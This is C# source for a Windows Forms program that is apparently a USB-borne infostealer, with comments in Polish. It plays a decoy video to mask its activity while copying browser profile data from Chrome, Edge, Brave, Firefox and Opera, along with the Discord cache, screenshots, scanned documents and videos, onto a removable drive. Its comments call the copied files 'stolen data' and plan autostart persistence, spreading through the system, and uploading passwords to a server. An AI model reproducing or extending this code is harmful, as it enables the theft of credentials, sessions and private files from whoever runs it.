using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;



namespace ClientProject
{
    public partial class Form1 : Form
    {
        int DONE = 0; // maks 8
        string username = Environment.UserName;
        string Appdata = "C:\\Users\\"+ Environment.UserName +"\\AppData\\Roaming";
        string Data_SLocation = "C:\\Users\\kheli\\OneDrive\\Pulpit\\data"; // copy to disc... stolen data this will be auto edited by detected usb system 
        string usb;


        // GoogleChrome Data copy [done]
        // Edge data Copy [done]
        // Opera Gx data copy i opera [done]
        // brave Data Copy [done]
        // Mozilla Data Copy [done]
        // Discord Cache [done]
        // InPrivate History [porzucone]
        // kopiowanie na usb [bedzie w innej wersji bedzie przesyłała na server] [done]
        // odpalanie pliku .mp4 lub innego i działanie w tle  [done]
        // zdjecia i filmy  [done]
        // 
        // 
        // [BajerFull] stworzenie systemu rozprzestrzeniania sie wirusa po systemie i dodanie go do autostartu
        // poczym program bedzie nadal zbierał na bieżąco informacje i hasła i przesyłał na server
        // 
        // zrobic tak ze jak porgram sie odpali to on sie kopiuje do innej lokacji i tam odpala aby uzytkownik mogl usunac
        // z pulpitu jesli bedzie chcial

        public Form1()
        {
            InitializeComponent();
        }

        public void Form1_Load(object sender, EventArgs e)
        {
           

            startFunction();
            

        }


        private void Google_Proces()
        {
            try
            {
                string Done_location = Data_SLocation + "\\Google";
                Directory.CreateDirectory(Done_location);

                string google_location = "C:\\Users\\" + username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default";


                Copy_files(google_location, Done_location);
                DONE++;
            }
            catch (Exception) { DONE++; }
        }

        private void Brave_Proces()
        {
            try
            {
                string Done_location = Data_SLocation + "\\Brave";
                Directory.CreateDirectory(Done_location);

                string brave_location = "C:\\Users\\" + username + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default";


                Copy_files(brave_location, Done_location);
                DONE++;
            }
            catch (Exception) { DONE++; }
           
        }

        private void Firefox_Proces()
        {
            try
            {
                string Done_location = Data_SLocation + "\\Firefox";
                Directory.CreateDirectory(Done_location);

                string firefox_location = "C:\\Users\\" + username + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles";


                CopyFolders(firefox_location, Done_location);
                DONE++;
            }
            catch (Exception) { DONE++; }
            
        }


        private void Edge_Proces()
        {
            try
            {
                string Done_location = Data_SLocation + "\\Edge";
                Directory.CreateDirectory(Done_location);

                string Edge_location = "C:\\Users\\" + username + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default";


                Copy_files(Edge_location, Done_location);
                DONE++;
            }
            catch (Exception) { DONE++; }

        }


        private void GX_Proces()
        {
            try
            {
                string Done_location = Data_SLocation + "\\OperaGX";
                Directory.CreateDirectory(Done_location);

                string OperaGX_location = "C:\\Users\\" + username + "\\AppData\\Roaming\\Opera Software\\Opera GX Stable";


                Copy_files(OperaGX_location, Done_location);
                DONE++;
            }
            catch (Exception) { DONE++; }
        }

        private void Opera_Proces()
        {
            try
            {
                string Done_location = Data_SLocation + "\\Opera";
                Directory.CreateDirectory(Done_location);

                string Opera_location = "C:\\Users\\" + username + "\\AppData\\Roaming\\Opera Software\\Opera Stable";


                Copy_files(Opera_location, Done_location);
                DONE++;
            }
            catch (Exception) { DONE++; }
        }








        private void Discord_Proces()
        {
            try
            {
                string Done_location = Data_SLocation + "\\DiscordCache";
                Directory.CreateDirectory(Done_location);

                string discord_location = Appdata + "\\discord\\Cache\\Cache_Data";


                Copy_files(discord_location, Done_location);
                DONE++;
            }
            catch (Exception) { DONE++; }

        }
        

        private void Photos_Project()
        {
            try
            {
                string Done_location = Data_SLocation + "\\Photos";
                Directory.CreateDirectory(Done_location);

                string photos_location1 = "C:\\Users\\" + username + "\\Videos";
                string photos_location2 = "C:\\Users\\" + username + "\\Documents\\Scanned Documents";
                string photos_location3 = "C:\\Users\\" + username + "\\OneDrive\\Obrazy\\Zrzuty ekranu";
                string photos_location4 = "C:\\Users\\" + username + "\\OneDrive\\Pictures\\Screenshot";


                Copy_files(photos_location1, Done_location);
                Copy_files(photos_location2, Done_location);



                try
                {
                    Copy_files(photos_location3, Done_location);
                }
                catch (Exception) 
                {

                    try
                    {
                        Copy_files(photos_location4, Done_location);
                    }
                    catch (Exception) { }
                }

                DONE++;
            }
            catch (Exception) { DONE++;}
        }


        private void OppenMaskFile()
        {
            try
            {
                Process.Start(usb + @"\Hidden\Video\Play.mp4");
            }
            catch (Exception) { }
            

        }


















        public static void Copy_files(string sourcePath, string destinationPath)
        {
            try
            {
                Directory.CreateDirectory(destinationPath);
                foreach (string file in Directory.GetFiles(sourcePath))
                {
                    string fileName = Path.GetFileName(file);
                    string destinationFile = Path.Combine(destinationPath, fileName);
                    File.Copy(file, destinationFile, true);
                }
            }
            catch (Exception) { }
            
            
            
        }


        static void CopyFolders(string sourcePath, string destinationPath)
        {
            try
            {
                Directory.CreateDirectory(destinationPath);
                string[] sourceFolders = Directory.GetDirectories(sourcePath);
                foreach (string folder in sourceFolders)
                {
                    string folderName = Path.GetFileName(folder);
                    string[] files = Directory.GetFiles(folder, "*", SearchOption.AllDirectories);
                    foreach (string file in files)
                    {
                        string relativePath = file.Substring(folder.Length + 1);
                        string newFile = Path.Combine(destinationPath, folderName, relativePath);
                        Directory.CreateDirectory(Path.GetDirectoryName(newFile));
                        File.Copy(file, newFile);
                    }
                }
            }
            catch (Exception) { }
            

        }



        private void usb_detect()
        {
            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                if (drive.DriveType == DriveType.Removable)
                {
                    usb = drive.Name;
                }
            }
        }






        void startFunction()
        {
            try
            {
                usb_detect();
            }
            catch { }


            try
            {
                if (Directory.Exists(usb + @"Hidden\Data"))
                {
                    Data_SLocation = usb + @"Hidden\Data";
                }
                else if (Directory.Exists(usb))
                {
                    Data_SLocation = usb;
                }
                else
                {
                    string errorPath = "C:\\Users\\" + username + "\\AppData\\Roaming\\ERRORDATA";
                    Directory.CreateDirectory(errorPath);
                    Data_SLocation = errorPath;
                }
            }
            catch (Exception) { }




                Thread threadMask = new Thread(new ThreadStart(OppenMaskFile));
                threadMask.Start();



                Thread threadG = new Thread(new ThreadStart(Google_Proces));
                threadG.Start();

                Thread threadB = new Thread(new ThreadStart(Brave_Proces));
                threadB.Start();

                Thread threadF = new Thread(new ThreadStart(Firefox_Proces));
                threadF.Start();

                Thread threadD = new Thread(new ThreadStart(Discord_Proces));
                threadD.Start();

                Thread threadP = new Thread(new ThreadStart(Photos_Project));
                threadP.Start();

                Thread threadE = new Thread(new ThreadStart(Edge_Proces));
                threadE.Start();

                Thread threadGX = new Thread(new ThreadStart(GX_Proces));
                threadGX.Start();

                Thread threadOp = new Thread(new ThreadStart(Opera_Proces));
                threadOp.Start();




 
            
        }

   
        
    }
}
